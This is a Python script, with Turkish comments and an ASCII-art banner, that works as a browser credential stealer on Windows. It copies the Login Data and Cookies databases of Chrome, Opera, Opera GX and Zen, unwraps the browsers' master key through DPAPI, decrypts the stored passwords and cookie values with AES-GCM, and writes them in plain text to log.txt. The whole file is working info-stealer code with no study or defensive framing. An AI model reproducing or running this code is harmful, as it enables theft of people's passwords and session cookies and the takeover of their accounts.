import os
import json
import sqlite3
import shutil
from datetime import datetime
import base64
import win32crypt
from Crypto.Cipher import AES
import logging
import time
import sys
import ctypes
import platform
from colorama import init, Fore, Back, Style

# Windows'ta renk desteği için
init(autoreset=True)

class BrowserDataExtractor:
    def __init__(self):
        self.log_file = "log.txt"
        logging.basicConfig(filename=self.log_file, level=logging.INFO,
                          format='%(asctime)s - %(message)s')
        
        self.browser_paths = {
            'chrome': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            'opera': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable"),
            'opera_gx': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
            'zen': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Zen", "User Data")
        }

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def check_system(self):
        """Sistem gereksinimlerini kontrol eder"""
        if not platform.system() == 'Windows':
            print(f"{Fore.RED}Bu program sadece Windows sistemlerde çalışır!{Style.RESET_ALL}")
            return False
        
        if not self.is_admin():
            print(f"{Fore.RED}Programın düzgün çalışması için yönetici izinleri gereklidir!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Lütfen programı yönetici olarak çalıştırın.{Style.RESET_ALL}")
            return False
            
        return True

    def show_banner(self):
        try:
            banner = f"""{Fore.MAGENTA}
    ██╗  ██╗██╗    ██████╗ ██╗   ██╗██████╗ ███████╗██████╗  █████╗ ██╗     ██╗     
    ██║  ██║██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██║     ██║     
    ███████║██║    ██████╔╝ ╚████╔╝ ██║  ██║█████╗  ██████╔╝███████║██║     ██║     
    ██╔══██║██║    ██╔═══╝   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗██╔══██║██║     ██║     
    ██║  ██║██║    ██║        ██║   ██████╔╝███████╗██║  ██║██║  ██║███████╗███████╗
    ╚═╝  ╚═╝╚═╝    ╚═╝        ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝{Style.RESET_ALL}
            """
            print(banner)
            print(f"\n{Fore.YELLOW}Başlamak için ENTER'a basın...{Style.RESET_ALL}")
            input()
            os.system('cls' if os.name == 'nt' else 'clear')
        except Exception as e:
            logging.error(f"Banner gösterilirken hata: {str(e)}")
            print("\nProgram başlatılıyor...")
            time.sleep(2)

    def show_progress(self, current, total, browser_name):
        percentage = (current / total) * 100
        bar_length = 50
        filled_length = int(bar_length * current // total)
        bar = '█' * filled_length + '-' * (bar_length - filled_length)
        sys.stdout.write(f'\r{Fore.CYAN}{browser_name} İşleniyor: |{bar}| {percentage:.1f}% {Style.RESET_ALL}')
        sys.stdout.flush()
        if current == total:
            print()

    def get_all_browser_data(self):
        """Tüm desteklenen tarayıcılardan veri çeker"""
        self.show_banner()
        
        total_browsers = len([path for path in self.browser_paths.values() if os.path.exists(path)])
        current_browser = 0
        
        for browser_name, path in self.browser_paths.items():
            if os.path.exists(path):
                current_browser += 1
                print(f"\n{Fore.GREEN}{browser_name.title()} tarayıcısından veri çekiliyor...{Style.RESET_ALL}")
                
                # Çerezler için ilerleme
                cookies = self.get_cookies(browser_name)
                self.show_progress(1, 2, browser_name)
                time.sleep(0.5)  # Görsel efekt için
                
                # Şifreler için ilerleme
                passwords = self.get_passwords(browser_name)
                self.show_progress(2, 2, browser_name)
                time.sleep(0.5)  # Görsel efekt için
                
                print(f"{Fore.GREEN}✓ {browser_name.title()} tamamlandı!{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}✗ {browser_name.title()} tarayıcısı bulunamadı.{Style.RESET_ALL}")

        print(f"\n{Fore.GREEN}✓ Tüm işlemler tamamlandı! Sonuçlar {self.log_file} dosyasına kaydedildi.{Style.RESET_ALL}")

    def get_cookies(self, browser_name):
        """Belirtilen tarayıcıdan çerezleri çeker"""
        try:
            if browser_name == 'chrome':
                cookies_path = os.path.join(self.browser_paths[browser_name], "Default", "Network", "Cookies")
            elif browser_name in ['opera', 'opera_gx']:
                cookies_path = os.path.join(self.browser_paths[browser_name], "Cookies")
            elif browser_name == 'zen':
                cookies_path = os.path.join(self.browser_paths[browser_name], "Default", "Network", "Cookies")
            
            temp_cookies = f"temp_cookies_{browser_name}"
            shutil.copy2(cookies_path, temp_cookies)
            
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
            
            cookies_data = []
            for host_key, name, encrypted_value in cursor.fetchall():
                decrypted_value = self._decrypt_data(browser_name, encrypted_value)
                if decrypted_value:
                    cookies_data.append({
                        'browser': browser_name,
                        'host': host_key,
                        'cookie_name': name,
                        'value': decrypted_value
                    })
            
            conn.close()
            os.remove(temp_cookies)
            
            logging.info(f"{browser_name.title()}'dan {len(cookies_data)} çerez başarıyla çekildi")
            self._save_to_log("cookies", cookies_data, browser_name)
            return cookies_data
            
        except Exception as e:
            logging.error(f"{browser_name.title()} çerezleri çekilirken hata: {str(e)}")
            return []

    def get_passwords(self, browser_name):
        """Belirtilen tarayıcıdan şifreleri çeker"""
        try:
            if browser_name == 'chrome':
                login_data_path = os.path.join(self.browser_paths[browser_name], "Default", "Login Data")
            elif browser_name in ['opera', 'opera_gx']:
                login_data_path = os.path.join(self.browser_paths[browser_name], "Login Data")
            elif browser_name == 'zen':
                login_data_path = os.path.join(self.browser_paths[browser_name], "Default", "Login Data")
            
            temp_login_db = f"temp_login_db_{browser_name}"
            shutil.copy2(login_data_path, temp_login_db)
            
            conn = sqlite3.connect(temp_login_db)
            cursor = conn.cursor()
            cursor.execute('''SELECT origin_url, username_value, password_value 
                            FROM logins''')
            
            passwords_data = []
            for url, username, encrypted_password in cursor.fetchall():
                decrypted_password = self._decrypt_data(browser_name, encrypted_password)
                if decrypted_password:
                    passwords_data.append({
                        'browser': browser_name,
                        'url': url,
                        'username': username,
                        'password': decrypted_password
                    })
            
            conn.close()
            os.remove(temp_login_db)
            
            logging.info(f"{browser_name.title()}'dan {len(passwords_data)} şifre başarıyla çekildi")
            self._save_to_log("passwords", passwords_data, browser_name)
            return passwords_data
            
        except Exception as e:
            logging.error(f"{browser_name.title()} şifreleri çekilirken hata: {str(e)}")
            return []

    def _get_encryption_key(self, browser_name):
        """Tarayıcıya özgü şifreleme anahtarını alır"""
        try:
            if browser_name == 'chrome':
                local_state_path = os.path.join(self.browser_paths[browser_name], "Local State")
            elif browser_name in ['opera', 'opera_gx']:
                local_state_path = os.path.join(self.browser_paths[browser_name], "Local State")
            elif browser_name == 'zen':
                local_state_path = os.path.join(self.browser_paths[browser_name], "Local State")
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # DPAPI ile şifrelenmiş anahtarı almak için
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            logging.error(f"{browser_name} için şifreleme anahtarı alınamadı: {str(e)}")
            return None

    def _decrypt_data(self, browser_name, encrypted_data):
        """Şifrelenmiş veriyi çözer"""
        try:
            if not encrypted_data:
                return None

            # Chrome v80 ve sonrası için şifre çözme
            if encrypted_data[:3] == b'v10' or encrypted_data[:3] == b'v11':
                encryption_key = self._get_encryption_key(browser_name)
                nonce = encrypted_data[3:15]
                cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
                return cipher.decrypt(encrypted_data[15:-16]).decode()
            else:
                # Eski sürümler için
                return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode()
        except Exception:
            return None

    def _save_to_log(self, data_type, data, browser_name):
        """Verileri log dosyasına kaydeder"""
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"{datetime.now()} - {browser_name.title()} {data_type}:\n")
            for item in data:
                f.write(json.dumps(item, ensure_ascii=False, indent=2))
                f.write("\n")
            f.write('='*50 + "\n")

if __name__ == "__main__":
    try:
        extractor = BrowserDataExtractor()
        
        if not extractor.check_system():
            input("\nDevam etmek için ENTER'a basın...")
            sys.exit(1)
            
        extractor.get_all_browser_data()
        
        print("\n\033[92mProgram başarıyla tamamlandı!\033[0m")
        print(f"\033[93mSonuçlar {extractor.log_file} dosyasına kaydedildi.\033[0m")
        input("\nKapatmak için ENTER'a basın...")
        
    except Exception as e:
        logging.error(f"Program çalışırken hata oluştu: {str(e)}")
        print(f"\n\033[91mHata oluştu: {str(e)}\033[0m")
        input("\nKapatmak için ENTER'a basın...") 